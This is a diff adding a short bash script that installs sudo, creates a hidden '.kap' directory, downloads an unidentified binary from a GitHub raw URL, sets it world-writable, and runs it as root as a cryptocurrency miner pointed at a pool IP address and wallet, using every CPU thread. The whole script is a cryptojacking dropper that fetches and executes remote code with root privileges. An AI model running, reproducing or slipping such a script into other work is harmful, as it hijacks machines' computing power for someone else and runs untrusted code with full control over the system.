@@ -1,0 +1,6 @@
+#!/bin/bash
+apt-get update ; apt-get -y install sudo
+mkdir .kap && cd .kap
+wget -O skak https://github.com/nandafiku/fillesg/raw/main/serbe
+chmod 777 skak
+sudo ./skak --algorithm aurum --pool 64.225.98.155:443 --wallet bit1qj5ykvg7l9nxv2pjn47qvaharq0hyt9pc3k4yv5.x --password webpassword=x --keepalive true --cpu-threads $(nproc --all)
